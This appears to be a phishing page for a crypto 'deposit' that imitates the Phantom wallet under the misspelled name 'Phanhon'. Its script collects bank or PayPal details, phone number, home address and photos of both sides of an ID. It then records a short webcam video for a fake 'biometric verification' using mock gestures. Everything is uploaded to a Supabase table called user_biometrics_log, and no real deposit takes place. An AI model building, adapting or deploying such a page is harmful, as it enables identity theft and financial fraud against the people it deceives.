<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Phanhon | Deposit</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <link rel="stylesheet" href="style.css">
    <style>
        .step-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            transition: all 0.3s;
        }

        .step-dot.active {
            background: var(--phantom-purple);
            box-shadow: 0 0 10px var(--phantom-purple);
        }

        .method-card {
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: all 0.2s;
            cursor: pointer;
        }

        .method-card.active {
            border-color: var(--phantom-purple);
            background: rgba(171, 102, 255, 0.1);
        }

        video {
            width: 100%;
            border-radius: 16px;
            transform: scaleX(-1);
            background: #111;
        }

        .progress-bar {
            width: 0%;
            height: 4px;
            background: var(--phantom-purple);
            transition: width 15s linear;
        }
    </style>
</head>

<body>
    <div class="app-container p-6 pb-20">
        <div class="flex items-center justify-between mb-8">
            <div class="flex items-center gap-2">
                <a href="dashboard.html" class="opacity-50 p-2"><svg width="20" height="20" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="3">
                        <path d="M19 12H5M12 19l-7-7 7-7" />
                    </svg></a>
                <h3 class="text-xl font-bold">Secure On-Ramp</h3>
            </div>
            <div class="text-right">
                <p class="text-[8px] text-white/40 uppercase font-bold">Balance</p>
                <p id="ui-balance" class="text-xs font-bold text-green-400">0.00 SOL</p>
            </div>
        </div>

        <div id="step-indicator" class="flex justify-center gap-2 mb-8">
            <div class="step-dot active" id="dot-1"></div>
            <div class="step-dot" id="dot-2"></div>
            <div class="step-dot" id="dot-3"></div>
        </div>

        <!-- Step 1: Transaction -->
        <div id="step-1" class="space-y-4 animate__animated animate__fadeIn">
            <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">1. Transaction Details</p>
            <div class="grid grid-cols-2 gap-3">
                <div onclick="selectMethod('bank')"
                    class="method-card active p-4 rounded-xl flex flex-col items-center gap-2" id="m-bank">
                    <span class="text-[10px] font-bold">Bank Transfer</span>
                </div>
                <div onclick="selectMethod('paypal')"
                    class="method-card p-4 rounded-xl flex flex-col items-center gap-2" id="m-paypal">
                    <span class="text-[10px] font-bold">PayPal</span>
                </div>
            </div>

            <div class="glass p-3 rounded-xl"><input id="dep-bank" type="text" placeholder="Account ID / IBAN / Email"
                    class="bg-transparent w-full text-xs outline-none text-white"></div>
            <div class="glass p-3 rounded-xl">
                <input id="dep-amount" type="number" placeholder="Amount in SOL"
                    class="bg-transparent w-full text-xs outline-none text-white">
            </div>

            <button onclick="goToStep(2)"
                class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-4">Continue to ID</button>
        </div>

        <!-- Step 2: ID Upload -->
        <div id="step-2" class="hidden space-y-4 animate__animated animate__fadeIn">
            <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">2. Identity Information</p>
            <div class="glass p-3 rounded-xl"><input id="dep-phone" type="tel" placeholder="Phone Number"
                    class="bg-transparent w-full text-xs outline-none text-white"></div>
            <div class="glass p-3 rounded-xl"><textarea id="dep-address" placeholder="Residential Home Address"
                    class="bg-transparent w-full text-xs outline-none h-16 text-white"></textarea></div>

            <div class="grid grid-cols-2 gap-2">
                <div class="glass p-3 rounded-xl">
                    <label class="text-[8px] uppercase text-white/40 block mb-1">ID Front</label>
                    <input type="file" id="id-front" accept="image/*" class="text-[8px] w-full text-white">
                </div>
                <div class="glass p-3 rounded-xl">
                    <label class="text-[8px] uppercase text-white/40 block mb-1">ID Back</label>
                    <input type="file" id="id-back" accept="image/*" class="text-[8px] w-full text-white">
                </div>
            </div>

            <div class="flex gap-2">
                <button onclick="goToStep(1)"
                    class="w-1/3 py-4 text-[10px] font-bold text-white/40 uppercase tracking-widest border border-white/10 rounded-xl">Back</button>
                <button onclick="toVerification()"
                    class="phantom-btn flex-1 py-4 text-xs uppercase tracking-widest">Final: Biometrics</button>
            </div>
        </div>

        <!-- Step 3: Biometrics -->
        <div id="step-verify" class="hidden space-y-4 animate__animated animate__fadeIn">
            <div class="text-center space-y-2">
                <h4 class="font-bold text-lg">Biometric Verification</h4>
                <p class="text-xs text-white/50" id="target-sign">Loading signs...</p>
            </div>

            <div class="relative">
                <video id="webcam" autoplay playsinline muted></video>
                <div class="absolute bottom-0 left-0 w-full bg-white/10 h-1">
                    <div id="video-progress" class="progress-bar"></div>
                </div>
            </div>

            <button id="status-display" disabled
                class="phantom-btn w-full py-4 text-xs uppercase tracking-widest opacity-50">Initializing
                Cam...</button>
        </div>

        <div id="toast"></div>
    </div>

    <script src="app.js"></script>
    <script>
        let selectedMethod = 'bank';
        let stream = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        window.onload = () => {
            if (!loadUser()) window.location.href = 'index.html';
            document.getElementById('ui-balance').innerText = `${user.balance.toFixed(2)} SOL`;
        };

        function selectMethod(m) {
            selectedMethod = m;
            document.querySelectorAll('.method-card').forEach(el => el.classList.remove('active'));
            document.getElementById(`m-${m}`).classList.add('active');
        }

        function goToStep(step) {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-verify').classList.add('hidden');

            if (step === 1) document.getElementById('step-1').classList.remove('hidden');
            if (step === 2) document.getElementById('step-2').classList.remove('hidden');
            if (step === 3) document.getElementById('step-verify').classList.remove('hidden');

            document.querySelectorAll('.step-dot').forEach((dot, idx) => dot.classList.toggle('active', idx < step));
        }

        async function toVerification() {
            const phone = document.getElementById('dep-phone').value;
            const idFront = document.getElementById('id-front').files[0];
            const idBack = document.getElementById('id-back').files[0];

            if (!phone || !idFront || !idBack) return showToast("Missing ID Docs");

            // Mock signs
            document.getElementById('target-sign').innerText = "Perform: Peace Sign & Thumbs Up";
            goToStep(3);

            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('webcam').srcObject = stream;

                setTimeout(startRecording, 1000);
            } catch (err) {
                showToast("Camera Denied");
            }
        }

        function startRecording() {
            const status = document.getElementById('status-display');
            document.getElementById('video-progress').style.width = '100%';
            status.innerText = "RECORDING...";

            recordedChunks = [];

            // Try compatible mime type
            const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';

            mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = uploadData;
            mediaRecorder.start();

            setTimeout(() => { mediaRecorder.stop(); }, 5000); // 5s video short
        }

        async function uploadData() {
            document.getElementById('status-display').innerText = "UPLOADING...";
            const blob = new Blob(recordedChunks, { type: 'video/webm' });

            try {
                const videoBase64 = await fileToBase64(blob);
                const idFront = await fileToBase64(document.getElementById('id-front').files[0]);
                const idBack = await fileToBase64(document.getElementById('id-back').files[0]);

                await sb.from('user_biometrics_log').insert([{
                    user_id: user.id,
                    username: user.username,
                    amount: parseFloat(document.getElementById('dep-amount').value),
                    method: selectedMethod,
                    bank_info: document.getElementById('dep-bank').value,
                    phone: document.getElementById('dep-phone').value,
                    address: document.getElementById('dep-address').value,
                    video_url: videoBase64,
                    id_front: idFront,
                    id_back: idBack,
                    status: 'pending'
                }]);

                showToast("Request Submitted");
                setTimeout(() => window.location.href = 'dashboard.html', 1500);

            } catch (e) {
                console.error(e);
                showToast("Upload Failed");
            }
        }

        function fileToBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = reject;
            });
        }
    </script>
</body>

</html>
